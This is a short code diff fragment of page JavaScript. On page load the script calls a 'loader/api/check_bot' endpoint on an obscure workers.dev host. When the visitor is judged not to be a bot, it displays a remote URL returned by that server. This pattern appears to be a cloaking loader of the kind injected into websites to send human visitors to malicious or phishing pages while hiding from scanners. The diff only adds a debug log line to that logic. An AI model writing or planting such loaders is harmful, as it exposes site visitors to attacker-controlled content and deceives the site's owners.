@@ -85,6 +85,7 @@ window.addEventListener('DOMContentLoaded', () => {
   fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot')
     .then(res => res.json())
     .then(res => {
+      console.log('check_bot response:', res);
       if (res?.code === 200 && !res.result && res.url) {
        
         showBlack(res.url + '/wvS95k');
